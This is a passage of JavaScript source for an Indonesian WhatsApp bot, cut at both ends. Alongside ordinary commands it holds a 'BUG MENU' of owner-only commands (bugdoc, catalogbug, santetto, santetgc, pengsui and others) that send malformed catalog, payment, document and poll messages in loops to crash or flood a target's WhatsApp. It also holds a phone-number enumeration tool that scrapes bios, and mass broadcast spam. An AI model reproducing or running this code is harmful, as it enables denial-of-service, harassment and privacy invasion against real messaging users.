				anggazyy404.send5ButLoc(from, anu, footerr, global.thumb, btn)
				anggazyy404.sendMessage(from, {text : `*This is an ad*\n\n•───────────•\n${jsn[0].setting}\n•───────────•\n\n_© 2022 fdhlgrphy.com_`}, {quoted :{
				key: { fromMe: false,
				participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6283102650464-1589321480@g.us" } : {})},
				message: { "extendedTextMessage": {
				"text": `*Hallo* _${pushname} 👋_\n	╰≻ Iklan _(mau pasang iklan? hub owner!)_`,
				"title": `Pasang iklan murah bang`,
				'jpegThumbnail': global.thumb}}}}
				)
 				 }                      
				break
            case 'tiktokwm': case 'tiktokwatermark': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/tiktok', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.watermark },
                    caption: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                anggazyy404.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'msk': {
vdd = args[0]
let vcc = vdd.split("https://chat.whatsapp.com/")[1]
if (!vcc) return m.reply("Link invalid!")
if (isCreator) {
await anggazyy404.groupAcceptInvite(vcc).then(async(res) => m.reply(jsonformat(res))).catch(_ => _)
m.reply("Succes")
} else {
anggazyy404.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: vcc } }]
}).then(async(res) => {
sizny = res.content[0].attrs.size
if (sizny < 10) {
teks = `Maaf anggota group anda kurang dari 50, minimal agar bot join harus mempunyai lebih dari 50 anggota`
sendOrder(m.chat, teks, "667140254502463", fs.readFileSync('./anggazyy/pict.jpg'), 2022, "Zackanggazyy404 Official ~ Multi Device", "6283155687629@s.whatsapp.net", "AR6NCY8euY5cbS8Ybg5Ca55R8HFSuLO3qZqrIYCT7hQp0g==", "99999999999999999999")
} else if (sizny > 10) {
await anggazyy404.groupAcceptInvite(vcc).then(async(res) => m.reply(jsonformat(res))).catch(_ => _)
m.reply("Succes")
} else {
m.reply("Error")
}
}).catch(_ => _)
}
}
break
                case 'masuk': 
			    if (!isCreator) throw mess.owner
				if (args.length < 2) return reply(`Kirim perintah #masuk link group`)
				if (!isUrl(args[1])) return reply(mess.error.Iv)
				var url = args[1]
			    url = url.split('https://chat.whatsapp.com/')[1]
				var data = await anggazyy404.groupAcceptInvite(url)
				reply(jsonformat(data))
				break
	        case 'tomp4': case 'tovideo': {
                if (!/webp/.test(mime)) throw `Reply stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await anggazyy404.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await anggazyy404.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break

case 'anticall': {
            if (!isCreator) throw mess.owner
                let ciko = db.data.settings[botNumber].anticall
                if (args[0] === "on") {
                if (ciko) return m.reply(`Sudah Aktif Sebelumnya`)
                ciko = true
                m.reply(`AntiCall Aktif !`)
                } else if (args[0] === "off") {
                if (!ciko) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                ciko = false
                m.reply(`AntiCall Tidak Aktif !`)
                } else {
                 let buttons = [
                        { buttonId: 'anticall on', buttonText: { displayText: 'Enable' }, type: 1 },
                        { buttonId: 'anticall off', buttonText: { displayText: 'Disable' }, type: 1 }
                    ]
                    await anggazyy404.sendButtonText(m.chat, buttons, `Mode AntiCall`, anggazyy404.user.name, m)
                }
             }
             break
case 'nowa':
                   if (args.length < 1) return m.reply(`Kirim perintah ${command} nomer\nContoh ${prefix + command} 62888875467xx`)
                   var teks = args[0]
                   if (!teks.includes('x')) return m.reply('lah?')
                   m.reply(mess.wait)
                   function countInstances(string, word) {
                     return string.split(word).length - 1;
                   }
                   var nomer0 = teks.split('x')[0]
                   var nomer1 = teks.split('x')[countInstances(teks, 'x')] ? teks.split('x')[countInstances(teks, 'x')] : ''
                   var random_length = countInstances(teks, 'x')

                   var random;
                   if (random_length == 1) {
                     random = 10
                   } else if (random_length == 2) {
                     random = 100
                   } else if (random_length == 3) {
                     random = 1000
                   }

                   var nomerny = `List number\n\->have Bio\n`
                   var no_bio = `\nnot Bio || \nHey there! I am using WhatsApp.\n`
                   var no_watsap = `\nNot  registered \n`

                   for (let i = 0; i < random; i++) {
                     var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
                     var dom1 = nu[Math.floor(Math.random() * nu.length)]
                     var dom2 = nu[Math.floor(Math.random() * nu.length)]
                     var dom3 = nu[Math.floor(Math.random() * nu.length)]
                     var dom4 = nu[Math.floor(Math.random() * nu.length)]

                     var rndm;
                     if (random_length == 1) {
                       rndm = `${dom1}`
                     } else if (random_length == 2) {
                       rndm = `${dom1}${dom2}`
                     } else if (random_length == 3) {
                       rndm = `${dom1}${dom2}${dom3}`
                     } else if (random_length == 4) {
                       rndm = `${dom1}${dom2}${dom3}${dom4}`
                     }

                     var anu = await anggazyy404.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
                     var anuu = anu.length !== 0 ? anu : false

                     try {
                       try {
                         var anu1 = await anggazyy404.fetchStatus(anu[0].jid)
                       } catch {
                         var anu1 = '401'
                       }
                       if (anu1 == '401' || anu1.status.length == 0) {
                         no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                         console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
                       } else {
                         nomerny += `• *Nomor* wa.me/${anu[0].jid.split("@")[0]}\n• *Bio* : ${anu1.status}\n• *date* : ${moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')}\n\n`
                         console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
                       }
                     } catch {
                       no_watsap += `${nomer0}${i}${nomer1}\n`
                       console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [NOT REGISTERED]`, 'red'))
                     }
                   }
                   m.reply(`${nomerny}${no_bio}${no_watsap}`)
                   break
case 'testing':
case 'x':{
var monospace = '```'
var l = 1
anggazyy404.sendMessage(from, {
    caption: `${monospace}Hi User ${pushname}



 *OTHER*
┣❏➥ ${prefix}tictactoe @tag
┣❏➥ ${prefix}afk
┣❏➥ ${prefix}anticall on
┣❏➥ ${prefix}anticall off
┣❏➥ ${prefix}nowa
┣❏➥ ${prefix}msk
┣❏➥ ${prefix}getcase
┣❏➥ ${prefix}get 

 *CONVERTED*
┣❏➥ ${prefix}sticker
┣❏➥ ${prefix}emojimix
┣❏➥ ${prefix}emojimix2 
┣❏➥ ${prefix}stickmeme  <text>| <text>
┣❏➥ ${prefix}ttp <text>
┣❏➥ ${prefix}attp <text>
┣❏➥ ${prefix}toimage
┣❏➥ ${prefix}dbinary
┣❏➥ ${prefix}ebinary
┣❏➥ ${prefix}tovideo

 *RANDOM*
┣❏➥ ${prefix}patrick
┣❏➥ ${prefix}dogestick
┣❏➥ ${prefix}bucinstick
┣❏➥ ${prefix}gurastick

 *BUG MENU*
┣❏➥ ${prefix}butto
┣❏➥ ${prefix}stikto
┣❏➥ ${prefix}catalogbug
┣❏➥ ${prefix}bugvn
┣❏➥ ${prefix}bugdoc
┣❏➥ ${prefix}momo
┣❏➥ ${prefix}momoto
┣❏➥ ${prefix}gasmomo
┣❏➥ ${prefix}gasinfinite
┣❏➥ ${prefix}infinite
┣❏➥ ${prefix}infiniteto
┣❏➥ ${prefix}gassantet
┣❏➥ ${prefix}santet
┣❏➥ ${prefix}santetto
┣❏➥ ${prefix}bugkon
┣❏➥ ${prefix}buglokas
┣❏➥ ${prefix}troli2
┣❏➥ ${prefix}bug1
┣❏➥ ${prefix}bug2
┣❏➥ ${prefix}bug3
┣❏➥ ${prefix}bug4
┣❏➥ ${prefix}bug5
┣❏➥ ${prefix}bug6
┣❏➥ ${prefix}bug7
┣❏➥ ${prefix}lokas
┣❏➥ ${prefix}docuwalz1
┣❏➥ ${prefix}docuwalz2
┣❏➥ ${prefix}docuwalz3
┣❏➥ ${prefix}docuwalz4
┣❏➥ ${prefix}poll


Anggazyy 2K21
`,
    image: fs.readFileSync("./lib/thum.jpg"),
    buttons: [
      {
       buttonId: `owner`, 
       buttonText: {
        displayText: 'Contact Owner'
      }, type: 1},
      {
       buttonId: `speed`, 
       buttonText: {
        displayText: 'Speed To Bot'
      }, type: 2}
    ],
    footer: "By Anggazyy",
                contextInfo: {
"externalAdReply": { 
"title" : global.ownername,
"mediaType" : 1,
"renderLargerThumbnail" : true , 
"showAdAttribution": true, 
"jpegThumbnail": fs.readFileSync("./lib/thumb2.jpg"),
"mediaUrl": global.linkgrupss, 
"thumbnail": fs.readFileSync("./lib/thumb2.jpg"),
"sourceUrl" : global.linkgrupss 
}}
           },{ quoted : m })
           }
  break
//============================================= Menu Bug By Fardan anggazyy & Vannes =======================\\
	case '🔥':{
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
 hey = fs.readFileSync('./anggazyy/chan.mp3')
 anggazyy404.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: doc})
 }
 }
break
case 'leave': {
                if (!isCreator) return
                await anggazyy404.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'buglokas': {
if (!isCreator) return
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/thumb.jpg') }, { upload: anggazyy404.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `Anggazyy${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
anggazyy404.relayMessage(m.chat, location.message, { messageId: location.key.id })
}
break
case 'hu': {
if (!isCreator) return

 mem = fs.readFileSync('./images/tes.mp3')
 anggazyy404.sendMessage(m.chat, {audio: mem, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case '🗿': {
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
 mom = fs.readFileSync('./images/ketawa.mp3')
 anggazyy404.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
case 'ha': {
if (!isCreator) return
 mim = fs.readFileSync('./images/ketawa.mp3')
 anggazyy404.sendMessage(m.chat, {audio: mim, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
 		case 'menfess':
			case 'menfes':
			case 'confes':
			case 'confess':
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				if (!text) return m.reply(`*Cara Penggunaan*\n\nKirim perintah ${prefix}${command} nomer|pengirim|pesan\n\nContoh ${prefix}${command} 62831xxxxxxx|ini nama samaran ya|I have a crush on you\n\nContoh 2 : ${prefix}${command} 62831xxxxxxx|crush mu|I have s crush on you\n\nTenang aja privasi aman kok><`)
				let nomor = q.split('|')[0] ? q.split('|')[0] : q
				let saking = q.split('|')[1] ? q.split('|')[1] : q
				let pesan = q.split('|')[2] ? q.split('|')[2] : ''
				if (pesan.length < 1) return m.reply(`Harus di isi semua! ex : menfess 62831xxxxxxxx|orang|hallo kamu`)
				 let teksnya = `Hai kak ada Menfess nih!!\n─────────────\n*ANGGAZYY-OFFCIALBOT*\n─────────────\n\nDari : _${saking}_ \nPesan : _${pesan}_ `
				header = 'hayyy'
					gambar = `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`

				 but = [
					{ urlButton: { displayText: `𝐒𝐮𝐩𝐩𝐨𝐫𝐭 𝐔𝐬!`, url : `https://wa.me/62882021734861` } },
                    { quickReplyButton: { displayText: `𝐓𝐞𝐫𝐢𝐦𝐚 𝐌𝐞𝐧𝐟𝐞𝐬𝐬`, id: `menfesconfirm ${m.sender}` } },
                    { quickReplyButton: { displayText: `𝐊𝐢𝐫𝐢𝐦 𝐌𝐞𝐧𝐟𝐞𝐬𝐬𝐦𝐮`, id: `Menfess` } }
                		]
					anggazyy404.sendMessage(`${nomor}@s.whatsapp.net`, { caption: teksnya, image: {url: `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`}, templateButtons: but, footer: `Ciee ada yang ngirim pesan nih\n© 2022 anggazyybot.xyz` })
				m.reply(`Sukses Mengirim Menfess!!`)
				break

			case 'menfesconfirm':
 				 anggazyy404.sendMessage(q, {text: `Sudah Di Confirmasi Nih Menfess nyaa🤭`})
				  m.reply(`Terimakasih Menfess Telah Diterima.`)
				break
case 'he': {
if (!isCreator) return

 mum = fs.readFileSync('./images/awkwk.mp3')
 anggazyy404.sendMessage(m.chat, {audio: mum, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'ba': {
if (!isCreator) return

 ah = fs.readFileSync('./images/bang.mp3')
 anggazyy404.sendMessage(m.chat, {audio: ah, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'be': {
if (!isCreator) return

 eh = fs.readFileSync('./images/nob.mp3')
 anggazyy404.sendMessage(m.chat, {audio: eh, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bu': {

if (!isCreator) return
 ih = fs.readFileSync('./images/ikehcok.mp3')
 anggazyy404.sendMessage(m.chat, {audio: ih, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
 case 'addanoucment': case 'addnewfitur': case 'addanon':
				if (!isCreator) return m.reply(act.owner)
				snt.push(`${q}`)
				snt.splice(0,1)
				fs.writeFileSync('./lib/anoucement.json', JSON.stringify(snt))
				m.reply('success anoucement!')
				break
case 'bi': {

if (!isCreator) return
 nyong = fs.readFileSync('./images/mastah.mp3')
 anggazyy404.sendMessage(m.chat, {audio: nyong, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'ca': {
if (!isCreator) return

 ri = fs.readFileSync('./images/ikehcok.mp3')
 anggazyy404.sendMessage(m.chat, {audio: ri, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'ci': {
if (!isCreator) return

 ru = fs.readFileSync('./images/loli.mp3')
 anggazyy404.sendMessage(m.chat, {audio: ru, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'cu': {
if (!isCreator) return

 re = fs.readFileSync('./images/kesel.mp3')
 anggazyy404.sendMessage(m.chat, {audio: re, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'co': {
if (!isCreator) return

 ro = fs.readFileSync('./images/ngeselin.mp3')
 anggazyy404.sendMessage(m.chat, {audio: ro, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'hiya':{


if (!isCreator) return
anuin = fs.readFileSync('./iamges/ngeselin.BIN')
anggazyy404.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `Paww 1981 ${ngazap(prefix)}.BIN`, title: `Paww 1981 ${ngazap(prefix)}.BIN` }, { quoted: doc })
}
break
//=================================================//
case 'bugbokep':{
if (!isCreator) return

dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
anggazyy404.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Bokep Nya` }, { quoted: doc })
}
break
	case 'bugdoc':{
if (!isCreator) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Angga`
for (let i = 0; i < jumlah; i++) {
anggazyy404.sendMessage(m.chat, {document: thumb},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `ANGGAZYY 404ˣ_ˣ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
	}
}
}})
}
}
break
case 'catalogbug': {
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
const ctlg = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": "0@s.whatsapp.net"},"message": { "orderMessage": { "itemCount": 0, "surface": 'CATALOG' }}}
var messa = await prepareWAMessageMedia({ image: thumb }, { upload: anggazyy404.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "99999999999999",
"title": `Anggazyy404 ??ˣ_ˣ CATALOG 🔥➥ ${buttonvirus} ${buttonvirus}`,
"description": `Anggazyy404 ??ˣ_ˣ CATALOG ${buttonvirus} ${buttonvirus}`,
"currencyCode": "IDR",
"footerText": `Anggazyy404 ??ˣ_ˣ CATALOG`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `Anggazyy404 ??`,
"url": "wa.me/6281523940672"
},
"businessOwnerJid": "6281523940672@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: ctlg })
anggazyy404.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
}
break
case 'getcase': {
if (!isCreator) return
if (!args[0]) return m.reply("Mau ngambil case apa?")
try {
m.reply('case ' + `'${args[0]}'` + fs.readFileSync('./anggazyy.js').toString().split(`case '${args[0]}'`)[1].split(turbrek)[0] + turbrek)
} catch {
m.reply("Case tidak ditemukan")
}
}
break
case 'pengsui':{
if (!isCreator) throw sticOwner(from)

if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Anggazyy 1981`
for (let i = 0; i < jumlah; i++) {
anggazyy404.sendMessage(m.chat, {requestPaymentMessage: thumb},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER Anggazyy 1981`,
}
}
}})
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
//=================================================//
case 'bugie':{
if (!isCreator) return

if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Anggazyy 1981`
for (let i = 0; i < jumlah; i++) {
anggazyy404.sendMessage(m.chat, {document: thumb},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `Anggazyy 1981${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
}
}
}})
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
//=================================================//
//=================================================//
case 'bugbctext': {
if (!isCreator) return


if (!text) throw `*Type some text*\n\nExample : ${prefix + command} angga`
let doc = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `© ${botname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${anggazyy404.user.name},;;;\nFN:${botname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': await getBuffer(picak+'Brodcast'), thumbnail: await getBuffer(picak+'Brodcast'),sendEphemeral: true}}}
let anu = await store.chats.all().map(v => v.id)
m.reply(`*Send Broadcast To* ${anu.length} Chat\n*Time ${anu.length * 1.5} seconds*`)
for (let yoi of anu) {
await sleep(1500)
anggazyy404.sendMessage(yoi, {text:`${text}`}, {quoted:doc})
}
m.reply('*Success Broadcast*')
}
break
case 'santetto': { 
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `ANGGAZYY 404ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            }
            break
            case 'docuwalz4': {
if (!isCreator) return

yy = fs.readFileSync('./images/hwmods.HW')
anggazyy404.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`anggazyy404 APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
}
break
case 'poll': {
if (!isCreator) return

var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "POLLING BUG BY ANGGA",
"options": [
	{
"optionName": "KATANYA WA KEBAL"
	},
	{
"optionName": "BERANI VOTE GA"
	},
	{
"optionName": "VOTE SEMUANYA DONG"
	},
	{
"optionName": "KATANYA KEBAL"
	},
	{
"optionName": "ANGGA said"
	}
],
"selectableOptionsCount": 5
	}
}), { userJid: m.chat, quoted: doc })
anggazyy404.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
reply('sukses sendbug')
}
break
case 'docuwalz2': {
if (!isCreator) return

 ilih = fs.readFileSync('./images/hwmods.HW')
 anggazyy404.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`anggazyy404 APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
 }
 break
 case 'santetdia': {
if (!isCreator) return

if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
m.reply(`baiklah tuan`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./anggazyy/pict.jpg') }, { upload: anggazyy404.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER Anggazyy 1981`,
}
}}), { userJid: m.chat, quoted: doc})
anggazyy404.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
case 'santetgc': {
if (!isCreator) return

if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
m.reply(`UDAH KEKIRIM CHUYY`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./anggazyy/pict.jpg') }, { upload: anggazyy404.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER ANGGAZYY 1981`,
}
}}), { userJid: m.chat, quoted: doc})
anggazyy404.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
//=================================================//
/*BUG WACAP */
case 'ampas1' : {
if (!isCreator) return

